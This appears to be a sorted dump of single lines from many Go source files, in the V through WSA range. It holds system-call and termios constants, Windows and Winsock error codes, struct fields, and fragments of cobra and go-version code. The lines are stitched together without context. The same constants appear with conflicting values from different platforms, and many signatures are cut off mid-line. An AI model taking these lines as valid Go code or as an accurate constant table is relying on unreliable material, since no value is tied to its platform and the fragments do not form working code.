VSTOP                         = 0x9
VSTRT                         = 0x7
VSUSP                                   = 0xa
VSUSP                             = 0xa
VSUSP                            = 0xa
VSUSP                            = 0xc
VSUSP                           = 9
VSUSP                          = 0xa
VSUSP                         = 0x9
VSUSP                         = 0xa
VSWTC                            = 0x7
VSWTC                            = 0x9
VSWTCH                           = 0x7
VSWTCH                        = 0x7
VT0                                         = 0x0
VT0                                     = 0x0
VT0                           = 0x0
VT1                                     = 0x10000
VT1                              = 0x10000
VT1                              = 0x4000
VT1                           = 0x4000
VT1                           = 0x8000
VTDELAY                       = 0x2000
VTDLY                                   = 0x10000
VTDLY                            = 0x10000
VTDLY                            = 0x4000
VTDLY                         = 0x4000
VTDLY                         = 0x8000
VTIME                                   = 0x11
VTIME                             = 0x11
VTIME                            = 0x5
VTIME                            = 0x7
VTIME                           = 10
VTIME                          = 0x11
VTIME                         = 0x5
VWERASE                                 = 0x4
VWERASE                           = 0x4
VWERASE                          = 0xa
VWERASE                          = 0xe
VWERASE                        = 0x4
VWERASE                       = 0xe
VWERSE                        = 0xd
V[A-Z0-9]
Val  uint32
Val [16]uint64
Val [2]int32
Val [2]uint32
Val [2]uint64
Val [32]uint32
Val [4]uint32
Valid    uint32
Valid bool // Valid is true if UUID is not NULL
ValidArgs
ValidArgs []string
ValidArgsFunction
ValidArgsFunction func(cmd 
ValidArgsFunction(...)
ValidArgsFunction: func(c 
ValidArgsFunction: func(cmd 
ValidLifetime      uint32
Validation of positional arguments can be specified using the 
Value
Value               Value               // value as set
Value    CryptObjidBlob
Value    Timespec
Value    Timeval
Value    [4]byte
Value   int32
Value  [4]byte
Value  [8]byte
Value [4096]uint8
Value [6]byte
Vendor  int16
Vendor0        uint16
Vendor1        uint16
Vendor2        uint16
Vendor3        uint8
Vendor4        uint8
Vendor5        uint8
Vendor6        uint8
VendorInfo   
Ver             uint32
VerifiedSigIndex uint32
Verify_cnt   uint64
Vers         uint8
Vers uint32 // version number for given Path
Vers: 
Version
Version                   uint16
Version                   uint8
Version               uint32
Version              uint32
Version           int32
Version        uint32
Version      [32]byte
Version      [3]uint32
Version      uint16
Version      uint8
Version     uint32
Version    [65]byte
Version   int32
Version   uint8
Version  [256]byte
Version  [257]byte
Version  [32]byte
Version  uint32
Version  uint8
Version [3]uint32
Version string
Version uint32
Version uint8
Version {
Version) Compare(other 
Version) Core() 
Version) Equal(o 
Version) GreaterThan(o 
Version) GreaterThanOrEqual(o 
Version) LessThan(o 
Version) LessThanOrEqual(o 
Version) Metadata() string {
Version) Original() string {
Version) Prerelease() string {
Version) Segments() []int {
Version) Segments64() []int64 {
Version) String() string {
Version) UnmarshalText(b []byte) error {
Version) bool
Version) bool {
Version) int {
Version.Equal
VersionRegexpRaw string = 
VersionRegexpRaw))
Versions used with go-version must follow [SemVer](http://semver.org/).
Version{
Vfs      uint32
Vfs    int32
Vfslen    int32
Vfsnumber int32
Vfsoff    int32
Vfstype   int32
Vfstype  int32
Vfsvers   int32
Vhid       uint8
Virtmem                   uint64
VirtualSize                  uintptr
Vlan_tci  uint16
Vlan_tci  uint32
Vlan_tpid uint16
Vm      Vmspace
Vmspace
Vnodemin           int32
Vnodeminpct        int32
Vnodepages         int32
Volname [64]uint8
VolumeSerialNumber uint32
Vtextmin           int32
Vtextminpct        int32
Vtextpages         int32
Vulnerability Vulnerability
WAIT_ABANDONED = 0x00000080
WAIT_FAILED    = 0xFFFFFFFF
WAIT_IO_COMPLETION = 0x000000C0
WAIT_OBJECT_0  = 0x00000000
WAIT_TIMEOUT                                                              syscall.Errno = 258
WAKE_MAGIC                                  = 0x20
WALL                                        = 0x40000000
WALL                              = 0x8
WALLSIG                           = 0x8
WALTSIG                           = 0x4
WARNING_IPSEC_MM_POLICY_PRUNED                                            syscall.Errno = 13024
WARNING_IPSEC_QM_POLICY_PRUNED                                            syscall.Errno = 13025
WCLONE                                      = 0x80000000
WCLONE                            = 0x4
WCONTFLG                      = 0xffff
WCONTINUED                                  = 0x8
WCONTINUED                              = 0x10
WCONTINUED                        = 0x4
WCONTINUED                        = 0x8
WCONTINUED                      = 0x4
WCONTINUED                     = 0x4
WCONTINUED                    = 0x8
WCOREFLAG                               = 0x80
WCOREFLAG                         = 0x80
WCOREFLAG                      = 0x80
WCOREFLG                      = 0x80
WDIOC_GETBOOTSTATUS              = 0x40045702
WDIOC_GETBOOTSTATUS              = 0x80045702
WDIOC_GETPRETIMEOUT              = 0x40045709
WDIOC_GETPRETIMEOUT              = 0x80045709
WDIOC_GETSTATUS                  = 0x40045701
WDIOC_GETSTATUS                  = 0x80045701
WDIOC_GETSUPPORT                 = 0x40285700
WDIOC_GETSUPPORT                 = 0x80285700
WDIOC_GETTEMP                    = 0x40045703
WDIOC_GETTEMP                    = 0x80045703
WDIOC_GETTIMELEFT                = 0x4004570a
WDIOC_GETTIMELEFT                = 0x8004570a
WDIOC_GETTIMEOUT                 = 0x40045707
WDIOC_GETTIMEOUT                 = 0x80045707
WDIOC_KEEPALIVE                  = 0x40045705
WDIOC_KEEPALIVE                  = 0x80045705
WDIOC_SETOPTIONS                 = 0x40045704
WDIOC_SETOPTIONS                 = 0x80045704
WDIOC_SETPRETIMEOUT                         = 0xc0045708
WDIOC_SETTIMEOUT                            = 0xc0045706
WDIOF_ALARMONLY                             = 0x400
WDIOF_CARDRESET                             = 0x20
WDIOF_EXTERN1                               = 0x4
WDIOF_EXTERN2                               = 0x8
WDIOF_FANFAULT                              = 0x2
WDIOF_KEEPALIVEPING                         = 0x8000
WDIOF_MAGICCLOSE                            = 0x100
WDIOF_OVERHEAT                              = 0x1
WDIOF_POWEROVER                             = 0x40
WDIOF_POWERUNDER                            = 0x10
WDIOF_PRETIMEOUT                            = 0x200
WDIOF_SETTIMEOUT                            = 0x80
WDIOF_UNKNOWN                               = -0x1
WDIOS_DISABLECARD                           = 0x1
WDIOS_ENABLECARD                            = 0x2
WDIOS_TEMPPANIC                             = 0x4
WDIOS_UNKNOWN                               = -0x1
WDIO[CFS]_/ 
WEB_E_INVALID_JSON_NUMBER                                                 Handle        = 0x83750008
WEB_E_INVALID_JSON_STRING                                                 Handle        = 0x83750007
WEB_E_INVALID_XML                                                         Handle        = 0x83750002
WEB_E_JSON_VALUE_NOT_FOUND                                                Handle        = 0x83750009
WEB_E_MISSING_REQUIRED_ATTRIBUTE                                          Handle        = 0x83750004
WEB_E_MISSING_REQUIRED_ELEMENT                                            Handle        = 0x83750003
WEB_E_RESOURCE_TOO_LARGE                                                  Handle        = 0x83750006
WEB_E_UNEXPECTED_CONTENT                                                  Handle        = 0x83750005
WEB_E_UNSUPPORTED_FORMAT                                                  Handle        = 0x83750001
WEP_E_BUFFER_TOO_LARGE                                                    Handle        = 0x88010009
WEP_E_FIXED_DATA_NOT_SUPPORTED                                            Handle        = 0x88010002
WEP_E_HARDWARE_NOT_COMPLIANT                                              Handle        = 0x88010003
WEP_E_LOCK_NOT_CONFIGURED                                                 Handle        = 0x88010004
WEP_E_NOT_PROVISIONED_ON_ALL_VOLUMES                                      Handle        = 0x88010001
WEP_E_NO_LICENSE                                                          Handle        = 0x88010006
WEP_E_OS_NOT_PROTECTED                                                    Handle        = 0x88010007
WEP_E_PROTECTION_SUSPENDED                                                Handle        = 0x88010005
WEP_E_UNEXPECTED_FAIL                                                     Handle        = 0x88010008
WER_E_ALREADY_REPORTING                                                   Handle        = 0x801B8004
WER_E_CANCELED                                                            Handle        = 0x801B8001
WER_E_CRASH_FAILURE                                                       Handle        = 0x801B8000
WER_E_DUMP_THROTTLED                                                      Handle        = 0x801B8005
WER_E_INSUFFICIENT_CONSENT                                                Handle        = 0x801B8006
WER_E_NETWORK_FAILURE                                                     Handle        = 0x801B8002
WER_E_NOT_INITIALIZED                                                     Handle        = 0x801B8003
WER_E_TOO_HEAVY                                                           Handle        = 0x801B8007
WER_S_ASSERT_CONTINUE                                                     Handle        = 0x001B000A
WER_S_DISABLED                                                            Handle        = 0x001B0003
WER_S_DISABLED_ARCHIVE                                                    Handle        = 0x001B0006
WER_S_DISABLED_QUEUE                                                      Handle        = 0x001B0005
WER_S_IGNORE_ALL_ASSERTS                                                  Handle        = 0x001B0009
WER_S_IGNORE_ASSERT_INSTANCE                                              Handle        = 0x001B0008
WER_S_REPORT_ASYNC                                                        Handle        = 0x001B0007
WER_S_REPORT_DEBUG                                                        Handle        = 0x001B0000
WER_S_REPORT_QUEUED                                                       Handle        = 0x001B0002
WER_S_REPORT_UPLOADED                                                     Handle        = 0x001B0001
WER_S_REPORT_UPLOADED_CAB                                                 Handle        = 0x001B000C
WER_S_SUSPENDED_UPLOAD                                                    Handle        = 0x001B0004
WER_S_THROTTLED                                                           Handle        = 0x001B000B
WEXITED                                     = 0x4
WEXITED                                 = 0x4
WEXITED                           = 0x10
WEXITED                        = 0x10
WEXITED                       = 0x1
WG/ 
WGALLOWEDIP_A_CIDR_MASK                = 0x3
WGALLOWEDIP_A_FAMILY                   = 0x1
WGALLOWEDIP_A_IPADDR                   = 0x2
WGALLOWEDIP_A_MAX                           = 0x3
WGALLOWEDIP_A_UNSPEC                   = 0x0
WGDEVICE_A_FLAGS                       = 0x5
WGDEVICE_A_FWMARK                      = 0x7
WGDEVICE_A_IFINDEX                     = 0x1
WGDEVICE_A_IFNAME                      = 0x2
WGDEVICE_A_LISTEN_PORT                 = 0x6
WGDEVICE_A_MAX                              = 0x8
WGDEVICE_A_PEERS                       = 0x8
WGDEVICE_A_PRIVATE_KEY                 = 0x3
WGDEVICE_A_PUBLIC_KEY                  = 0x4
WGDEVICE_A_UNSPEC                      = 0x0
WGDEVICE_F_REPLACE_PEERS               = 0x1
WGPEER_A_ALLOWEDIPS                    = 0x9
WGPEER_A_ENDPOINT                      = 0x4
WGPEER_A_FLAGS                         = 0x3
WGPEER_A_LAST_HANDSHAKE_TIME           = 0x6
WGPEER_A_MAX                                = 0xa
WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL = 0x5
WGPEER_A_PRESHARED_KEY                 = 0x2
WGPEER_A_PROTOCOL_VERSION              = 0xa
WGPEER_A_PUBLIC_KEY                    = 0x1
WGPEER_A_RX_BYTES                      = 0x7
WGPEER_A_TX_BYTES                      = 0x8
WGPEER_A_UNSPEC                        = 0x0
WGPEER_F_REMOVE_ME                     = 0x1
WGPEER_F_REPLACE_ALLOWEDIPS            = 0x2
WGPEER_F_UPDATE_ONLY                   = 0x4
WG_CMD_GET_DEVICE                      = 0x0
WG_CMD_MAX                                  = 0x1
WG_CMD_SET_DEVICE                      = 0x1
WG_GENL_VERSION                             = 0x1
WG_KEY_LEN                                  = 0x20
WHV_E_GPA_RANGE_NOT_FOUND                                                 Handle        = 0x80370305
WHV_E_INSUFFICIENT_BUFFER                                                 Handle        = 0x80370301
WHV_E_INVALID_PARTITION_CONFIG                                            Handle        = 0x80370304
WHV_E_INVALID_VP_REGISTER_NAME                                            Handle        = 0x80370309
WHV_E_INVALID_VP_STATE                                                    Handle        = 0x80370308
WHV_E_UNKNOWN_CAPABILITY                                                  Handle        = 0x80370300
WHV_E_UNKNOWN_PROPERTY                                                    Handle        = 0x80370302
WHV_E_UNSUPPORTED_HYPERVISOR_CONFIG                                       Handle        = 0x80370303
WHV_E_VP_ALREADY_EXISTS                                                   Handle        = 0x80370306
WHV_E_VP_DOES_NOT_EXIST                                                   Handle        = 0x80370307
WINCODEC_ERR_ALREADYLOCKED                                                Handle        = 0x88982F0D
WINCODEC_ERR_BADHEADER                                                    Handle        = 0x88982F61
WINCODEC_ERR_BADIMAGE                                                     Handle        = 0x88982F60
WINCODEC_ERR_BADMETADATAHEADER                                            Handle        = 0x88982F63
WINCODEC_ERR_BADSTREAMDATA                                                Handle        = 0x88982F70
WINCODEC_ERR_CODECNOTHUMBNAIL                                             Handle        = 0x88982F44
WINCODEC_ERR_CODECPRESENT                                                 Handle        = 0x88982F43
WINCODEC_ERR_CODECTOOMANYSCANLINES                                        Handle        = 0x88982F46
WINCODEC_ERR_COMPONENTINITIALIZEFAILURE                                   Handle        = 0x88982F8B
WINCODEC_ERR_COMPONENTNOTFOUND                                            Handle        = 0x88982F50
WINCODEC_ERR_DUPLICATEMETADATAPRESENT                                     Handle        = 0x88982F8D
WINCODEC_ERR_FRAMEMISSING                                                 Handle        = 0x88982F62
WINCODEC_ERR_IMAGESIZEOUTOFRANGE                                          Handle        = 0x88982F51
WINCODEC_ERR_INSUFFICIENTBUFFER                                           Handle        = 0x88982F8C
WINCODEC_ERR_INTERNALERROR                                                Handle        = 0x88982F48
WINCODEC_ERR_INVALIDJPEGSCANINDEX                                         Handle        = 0x88982F96
WINCODEC_ERR_INVALIDPROGRESSIVELEVEL                                      Handle        = 0x88982F95
WINCODEC_ERR_INVALIDQUERYCHARACTER                                        Handle        = 0x88982F93
WINCODEC_ERR_INVALIDQUERYREQUEST                                          Handle        = 0x88982F90
WINCODEC_ERR_INVALIDREGISTRATION                                          Handle        = 0x88982F8A
WINCODEC_ERR_NOTINITIALIZED                                               Handle        = 0x88982F0C
WINCODEC_ERR_PALETTEUNAVAILABLE                                           Handle        = 0x88982F45
WINCODEC_ERR_PROPERTYNOTFOUND                                             Handle        = 0x88982F40
WINCODEC_ERR_PROPERTYNOTSUPPORTED                                         Handle        = 0x88982F41
WINCODEC_ERR_PROPERTYSIZE                                                 Handle        = 0x88982F42
WINCODEC_ERR_PROPERTYUNEXPECTEDTYPE                                       Handle        = 0x88982F8E
WINCODEC_ERR_REQUESTONLYVALIDATMETADATAROOT                               Handle        = 0x88982F92
WINCODEC_ERR_SOURCERECTDOESNOTMATCHDIMENSIONS                             Handle        = 0x88982F49
WINCODEC_ERR_STREAMNOTAVAILABLE                                           Handle        = 0x88982F73
WINCODEC_ERR_STREAMREAD                                                   Handle        = 0x88982F72
WINCODEC_ERR_STREAMWRITE                                                  Handle        = 0x88982F71
WINCODEC_ERR_TOOMUCHMETADATA                                              Handle        = 0x88982F52
WINCODEC_ERR_UNEXPECTEDMETADATATYPE                                       Handle        = 0x88982F91
WINCODEC_ERR_UNEXPECTEDSIZE                                               Handle        = 0x88982F8F
WINCODEC_ERR_UNKNOWNIMAGEFORMAT                                           Handle        = 0x88982F07
WINCODEC_ERR_UNSUPPORTEDOPERATION                                         Handle        = 0x88982F81
WINCODEC_ERR_UNSUPPORTEDPIXELFORMAT                                       Handle        = 0x88982F80
WINCODEC_ERR_UNSUPPORTEDVERSION                                           Handle        = 0x88982F0B
WINCODEC_ERR_VALUEOUTOFRANGE                                              Handle        = 0x88982F05
WINCODEC_ERR_WIN32ERROR                                                   Handle        = 0x88982F94
WINCODEC_ERR_WRONGSTATE                                                   Handle        = 0x88982F04
WININET_E_ASYNC_THREAD_FAILED                                             Handle        = 0x80072F0F
WININET_E_BAD_AUTO_PROXY_SCRIPT                                           Handle        = 0x80072F86
WININET_E_BAD_OPTION_LENGTH                                               Handle        = 0x80072EEA
WININET_E_BAD_REGISTRY_PARAMETER                                          Handle        = 0x80072EF6
WININET_E_CANNOT_CONNECT                                                  Handle        = 0x80072EFD
WININET_E_CHG_POST_IS_NON_SECURE                                          Handle        = 0x80072F0A
WININET_E_CLIENT_AUTH_CERT_NEEDED                                         Handle        = 0x80072F0C
WININET_E_CLIENT_AUTH_NOT_SETUP                                           Handle        = 0x80072F0E
WININET_E_CONNECTION_ABORTED                                              Handle        = 0x80072EFE
WININET_E_CONNECTION_RESET                                                Handle        = 0x80072EFF
WININET_E_COOKIE_DECLINED                                                 Handle        = 0x80072F82
WININET_E_COOKIE_NEEDS_CONFIRMATION                                       Handle        = 0x80072F81
WININET_E_DECODING_FAILED                                                 Handle        = 0x80072F8F
WININET_E_DIALOG_PENDING                                                  Handle        = 0x80072F11
WININET_E_DISCONNECTED                                                    Handle        = 0x80072F83
WININET_E_DOWNLEVEL_SERVER                                                Handle        = 0x80072F77
WININET_E_EXTENDED_ERROR                                                  Handle        = 0x80072EE3
WININET_E_FAILED_DUETOSECURITYCHECK                                       Handle        = 0x80072F8B
WININET_E_FORCE_RETRY                                                     Handle        = 0x80072F00
WININET_E_HANDLE_EXISTS                                                   Handle        = 0x80072F04
WININET_E_HEADER_ALREADY_EXISTS                                           Handle        = 0x80072F7B
WININET_E_HEADER_NOT_FOUND                                                Handle        = 0x80072F76
WININET_E_HTTPS_HTTP_SUBMIT_REDIR                                         Handle        = 0x80072F14
WININET_E_HTTPS_TO_HTTP_ON_REDIR                                          Handle        = 0x80072F08
WININET_E_HTTP_TO_HTTPS_ON_REDIR                                          Handle        = 0x80072F07
WININET_E_INCORRECT_FORMAT                                                Handle        = 0x80072EFB
WININET_E_INCORRECT_HANDLE_STATE                                          Handle        = 0x80072EF3
WININET_E_INCORRECT_HANDLE_TYPE                                           Handle        = 0x80072EF2
WININET_E_INCORRECT_PASSWORD                                              Handle        = 0x80072EEE
WININET_E_INCORRECT_USER_NAME                                             Handle        = 0x80072EED
WININET_E_INTERNAL_ERROR                                                  Handle        = 0x80072EE4
WININET_E_INVALID_CA                                                      Handle        = 0x80072F0D
WININET_E_INVALID_HEADER                                                  Handle        = 0x80072F79
WININET_E_INVALID_OPERATION                                               Handle        = 0x80072EF0
WININET_E_INVALID_OPTION                                                  Handle        = 0x80072EE9
WININET_E_INVALID_PROXY_REQUEST                                           Handle        = 0x80072F01
WININET_E_INVALID_QUERY_REQUEST                                           Handle        = 0x80072F7A
WININET_E_INVALID_SERVER_RESPONSE                                         Handle        = 0x80072F78
WININET_E_INVALID_URL                                                     Handle        = 0x80072EE5
WININET_E_ITEM_NOT_FOUND                                                  Handle        = 0x80072EFC
WININET_E_LOGIN_FAILURE                                                   Handle        = 0x80072EEF
WININET_E_LOGIN_FAILURE_DISPLAY_ENTITY_BODY                               Handle        = 0x80072F8E
WININET_E_MIXED_SECURITY                                                  Handle        = 0x80072F09
WININET_E_NAME_NOT_RESOLVED                                               Handle        = 0x80072EE7
WININET_E_NEED_UI                                                         Handle        = 0x80072F02
WININET_E_NOT_INITIALIZED                                                 Handle        = 0x80072F8C
WININET_E_NOT_PROXY_REQUEST                                               Handle        = 0x80072EF4
WININET_E_NOT_REDIRECTED                                                  Handle        = 0x80072F80
WININET_E_NO_CALLBACK                                                     Handle        = 0x80072EF9
WININET_E_NO_CONTEXT                                                      Handle        = 0x80072EF8
WININET_E_NO_DIRECT_ACCESS                                                Handle        = 0x80072EF7
WININET_E_NO_NEW_CONTAINERS                                               Handle        = 0x80072F13
WININET_E_OPERATION_CANCELLED                                             Handle        = 0x80072EF1
WININET_E_OPTION_NOT_SETTABLE                                             Handle        = 0x80072EEB
WININET_E_OUT_OF_HANDLES                                                  Handle        = 0x80072EE1
WININET_E_POST_IS_NON_SECURE                                              Handle        = 0x80072F0B
WININET_E_PROTOCOL_NOT_FOUND                                              Handle        = 0x80072EE8
WININET_E_PROXY_SERVER_UNREACHABLE                                        Handle        = 0x80072F85
WININET_E_REDIRECT_FAILED                                                 Handle        = 0x80072F7C
WININET_E_REDIRECT_NEEDS_CONFIRMATION                                     Handle        = 0x80072F88
WININET_E_REDIRECT_SCHEME_CHANGE                                          Handle        = 0x80072F10
WININET_E_REGISTRY_VALUE_NOT_FOUND                                        Handle        = 0x80072EF5
WININET_E_REQUEST_PENDING                                                 Handle        = 0x80072EFA
WININET_E_RETRY_DIALOG                                                    Handle        = 0x80072F12
WININET_E_SECURITY_CHANNEL_ERROR                                          Handle        = 0x80072F7D
WININET_E_SEC_CERT_CN_INVALID                                             Handle        = 0x80072F06
WININET_E_SEC_CERT_DATE_INVALID                                           Handle        = 0x80072F05
WININET_E_SEC_CERT_ERRORS                                                 Handle        = 0x80072F17
WININET_E_SEC_CERT_REVOKED                                                Handle        = 0x80072F8A
WININET_E_SEC_CERT_REV_FAILED                                             Handle        = 0x80072F19
WININET_E_SEC_INVALID_CERT                                                Handle        = 0x80072F89
WININET_E_SERVER_UNREACHABLE                                              Handle        = 0x80072F84
WININET_E_SHUTDOWN                                                        Handle        = 0x80072EEC
WININET_E_TCPIP_NOT_INSTALLED                                             Handle        = 0x80072F7F
WININET_E_TIMEOUT                                                         Handle        = 0x80072EE2
WININET_E_UNABLE_TO_CACHE_FILE                                            Handle        = 0x80072F7E
WININET_E_UNABLE_TO_DOWNLOAD_SCRIPT                                       Handle        = 0x80072F87
WININET_E_UNRECOGNIZED_SCHEME                                             Handle        = 0x80072EE6
WINML_ERR_INVALID_BINDING                                                 Handle        = 0x88900002
WINML_ERR_INVALID_DEVICE                                                  Handle        = 0x88900001
WINML_ERR_SIZE_MISMATCH                                                   Handle        = 0x88900004
WINML_ERR_VALUE_NOTFOUND                                                  Handle        = 0x88900003
WINTRUST_ACTION_GENERIC_VERIFY_V2 = GUID{
WIN_ACKMEDIACHANGE                          = 0xdb
WIN_CHECKPOWERMODE1                         = 0xe5
WIN_CHECKPOWERMODE2                         = 0x98
WIN_DEVICE_RESET                            = 0x8
WIN_DIAGNOSE                                = 0x90
WIN_DOORLOCK                                = 0xde
WIN_DOORUNLOCK                              = 0xdf
WIN_DOWNLOAD_MICROCODE                      = 0x92
WIN_FLUSH_CACHE                             = 0xe7
WIN_FLUSH_CACHE_EXT                         = 0xea
WIN_FORMAT                                  = 0x50
WIN_GETMEDIASTATUS                          = 0xda
WIN_IDENTIFY                                = 0xec
WIN_IDENTIFY_DMA                            = 0xee
WIN_IDLEIMMEDIATE                           = 0xe1
WIN_INIT                                    = 0x60
WIN_MEDIAEJECT                              = 0xed
WIN_MULTREAD                                = 0xc4
WIN_MULTREAD_EXT                            = 0x29
WIN_MULTWRITE                               = 0xc5
WIN_MULTWRITE_EXT                           = 0x39
WIN_NOP                                     = 0x0
WIN_PACKETCMD                               = 0xa0
WIN_PIDENTIFY                               = 0xa1
WIN_POSTBOOT                                = 0xdc
WIN_PREBOOT                                 = 0xdd
WIN_QUEUED_SERVICE                          = 0xa2
WIN_READ                                    = 0x20
WIN_READDMA                                 = 0xc8
WIN_READDMA_EXT                             = 0x25
WIN_READDMA_ONCE                            = 0xc9
WIN_READDMA_QUEUED                          = 0xc7
WIN_READDMA_QUEUED_EXT                      = 0x26
WIN_READ_BUFFER                             = 0xe4
WIN_READ_EXT                                = 0x24
WIN_READ_LONG                               = 0x22
WIN_READ_LONG_ONCE                          = 0x23
WIN_READ_NATIVE_MAX                         = 0xf8
WIN_READ_NATIVE_MAX_EXT                     = 0x27
WIN_READ_ONCE                               = 0x21
WIN_RECAL                                   = 0x10
WIN_RESTORE                                 = 0x10
WIN_SECURITY_DISABLE                        = 0xf6
WIN_SECURITY_ERASE_PREPARE                  = 0xf3
WIN_SECURITY_ERASE_UNIT                     = 0xf4
WIN_SECURITY_FREEZE_LOCK                    = 0xf5
WIN_SECURITY_SET_PASS                       = 0xf1
WIN_SECURITY_UNLOCK                         = 0xf2
WIN_SEEK                                    = 0x70
WIN_SETFEATURES                             = 0xef
WIN_SETIDLE1                                = 0xe3
WIN_SETIDLE2                                = 0x97
WIN_SETMULT                                 = 0xc6
WIN_SET_MAX                                 = 0xf9
WIN_SET_MAX_EXT                             = 0x37
WIN_SLEEPNOW1                               = 0xe6
WIN_SLEEPNOW2                               = 0x99
WIN_SMART                                   = 0xb0
WIN_SPECIFY                                 = 0x91
WIN_SRST                                    = 0x8
WIN_STANDBY                                 = 0xe2
WIN_STANDBY2                                = 0x96
WIN_STANDBYNOW1                             = 0xe0
WIN_STANDBYNOW2                             = 0x94
WIN_VERIFY                                  = 0x40
WIN_VERIFY_EXT                              = 0x42
WIN_VERIFY_ONCE                             = 0x41
WIN_WRITE                                   = 0x30
WIN_WRITEDMA                                = 0xca
WIN_WRITEDMA_EXT                            = 0x35
WIN_WRITEDMA_ONCE                           = 0xcb
WIN_WRITEDMA_QUEUED                         = 0xcc
WIN_WRITEDMA_QUEUED_EXT                     = 0x36
WIN_WRITE_BUFFER                            = 0xe8
WIN_WRITE_EXT                               = 0x34
WIN_WRITE_LONG                              = 0x32
WIN_WRITE_LONG_ONCE                         = 0x33
WIN_WRITE_ONCE                              = 0x31
WIN_WRITE_SAME                              = 0xe9
WIN_WRITE_VERIFY                            = 0x3c
WLINUXCLONE                       = 0x80000000
WLINUXCLONE                    = 0x80000000
WNOHANG                                     = 0x1
WNOHANG                                 = 0x1
WNOHANG                           = 0x1
WNOHANG                         = 0x1
WNOHANG                        = 0x1
WNOHANG                       = 0x40
WNOTHREAD                                   = 0x20000000
WNOWAIT                                     = 0x1000000
WNOWAIT                                 = 0x20
WNOWAIT                           = 0x10000
WNOWAIT                           = 0x8
WNOWAIT                        = 0x8
WNOWAIT                       = 0x80
WNOZOMBIE                         = 0x20000
WOPTMASK                      = 0xcf
WOPTSCHECKED                      = 0x40000
WORDSIZE                                = 0x40
WORDSIZE                         = 0x20
WORDSIZE                         = 0x40
WORKDIR pty
WPARSTART                     = 0x1
WPARSTOP                      = 0x2
WPN_E_ACCESS_DENIED                                                       Handle        = 0x803E0117
WPN_E_ALL_URL_NOT_COMPLETED                                               Handle        = 0x803E0203
WPN_E_CALLBACK_ALREADY_REGISTERED                                         Handle        = 0x803E0206
WPN_E_CHANNEL_CLOSED                                                      Handle        = 0x803E0100
WPN_E_CHANNEL_REQUEST_NOT_COMPLETE                                        Handle        = 0x803E0101
WPN_E_CLOUD_AUTH_UNAVAILABLE                                              Handle        = 0x803E011A
WPN_E_CLOUD_DISABLED                                                      Handle        = 0x803E0109
WPN_E_CLOUD_DISABLED_FOR_APP                                              Handle        = 0x803E020B
WPN_E_CLOUD_INCAPABLE                                                     Handle        = 0x803E0110
WPN_E_CLOUD_SERVICE_UNAVAILABLE                                           Handle        = 0x803E011B
WPN_E_DEV_ID_SIZE                                                         Handle        = 0x803E0120
WPN_E_DUPLICATE_CHANNEL                                                   Handle        = 0x803E0104
WPN_E_DUPLICATE_REGISTRATION                                              Handle        = 0x803E0118
WPN_E_FAILED_LOCK_SCREEN_UPDATE_INTIALIZATION                             Handle        = 0x803E011C
WPN_E_GROUP_ALPHANUMERIC                                                  Handle        = 0x803E020A
WPN_E_GROUP_SIZE                                                          Handle        = 0x803E0209
WPN_E_IMAGE_NOT_FOUND_IN_CACHE                                            Handle        = 0x803E0202
WPN_E_INTERNET_INCAPABLE                                                  Handle        = 0x803E0113
WPN_E_INVALID_APP                                                         Handle        = 0x803E0102
WPN_E_INVALID_CLOUD_IMAGE                                                 Handle        = 0x803E0204
WPN_E_INVALID_HTTP_STATUS_CODE                                            Handle        = 0x803E012B
WPN_E_NOTIFICATION_DISABLED                                               Handle        = 0x803E0111
WPN_E_NOTIFICATION_HIDDEN                                                 Handle        = 0x803E0107
WPN_E_NOTIFICATION_ID_MATCHED                                             Handle        = 0x803E0205
WPN_E_NOTIFICATION_INCAPABLE                                              Handle        = 0x803E0112
WPN_E_NOTIFICATION_NOT_POSTED                                             Handle        = 0x803E0108
WPN_E_NOTIFICATION_POSTED                                                 Handle        = 0x803E0106
WPN_E_NOTIFICATION_SIZE                                                   Handle        = 0x803E0115
WPN_E_NOTIFICATION_TYPE_DISABLED                                          Handle        = 0x803E0114
WPN_E_OUTSTANDING_CHANNEL_REQUEST                                         Handle        = 0x803E0103
WPN_E_OUT_OF_SESSION                                                      Handle        = 0x803E0200
WPN_E_PLATFORM_UNAVAILABLE                                                Handle        = 0x803E0105
WPN_E_POWER_SAVE                                                          Handle        = 0x803E0201
WPN_E_PUSH_NOTIFICATION_INCAPABLE                                         Handle        = 0x803E0119
WPN_E_STORAGE_LOCKED                                                      Handle        = 0x803E0208
WPN_E_TAG_ALPHANUMERIC                                                    Handle        = 0x803E012A
WPN_E_TAG_SIZE                                                            Handle        = 0x803E0116
WPN_E_TOAST_NOTIFICATION_DROPPED                                          Handle        = 0x803E0207
WRAP                          = 0x20000
WRITE_DAC                = 0x00040000
WRITE_OWNER              = 0x00080000
WSABASEERR                                                                syscall.Errno = 10000
WSABuf
WSACleanup() (err error) [failretval==socket_error] = ws2_32.WSACleanup
WSADESCRIPTION_LEN = 256
WSAData) (sockerr error) = ws2_32.WSAStartup
WSAData) (sockerr error) {
WSAEACCES                                                                 syscall.Errno = 10013
WSAEADDRINUSE                                                             syscall.Errno = 10048
WSAEADDRNOTAVAIL                                                          syscall.Errno = 10049
WSAEAFNOSUPPORT                                                           syscall.Errno = 10047
WSAEALREADY                                                               syscall.Errno = 10037
WSAEBADF                                                                  syscall.Errno = 10009
WSAECANCELLED                                                             syscall.Errno = 10103
WSAECONNABORTED                                                           syscall.Errno = 10053
WSAECONNREFUSED                                                           syscall.Errno = 10061
WSAECONNRESET                                                             syscall.Errno = 10054
WSAEDESTADDRREQ                                                           syscall.Errno = 10039
WSAEDISCON                                                                syscall.Errno = 10101
WSAEDQUOT                                                                 syscall.Errno = 10069
WSAEFAULT                                                                 syscall.Errno = 10014
WSAEHOSTDOWN                                                              syscall.Errno = 10064
WSAEHOSTUNREACH                                                           syscall.Errno = 10065
WSAEINPROGRESS                                                            syscall.Errno = 10036
WSAEINTR                                                                  syscall.Errno = 10004
WSAEINVAL                                                                 syscall.Errno = 10022
WSAEINVALIDPROCTABLE                                                      syscall.Errno = 10104
WSAEINVALIDPROVIDER                                                       syscall.Errno = 10105
WSAEISCONN                                                                syscall.Errno = 10056
WSAELOOP                                                                  syscall.Errno = 10062
WSAEMFILE                                                                 syscall.Errno = 10024
WSAEMSGSIZE                                                               syscall.Errno = 10040
WSAENAMETOOLONG                                                           syscall.Errno = 10063
WSAENETDOWN                                                               syscall.Errno = 10050
WSAENETRESET                                                              syscall.Errno = 10052
WSAENETUNREACH                                                            syscall.Errno = 10051
WSAENOBUFS                                                                syscall.Errno = 10055
WSAENOMORE                                                                syscall.Errno = 10102
WSAENOPROTOOPT                                                            syscall.Errno = 10042
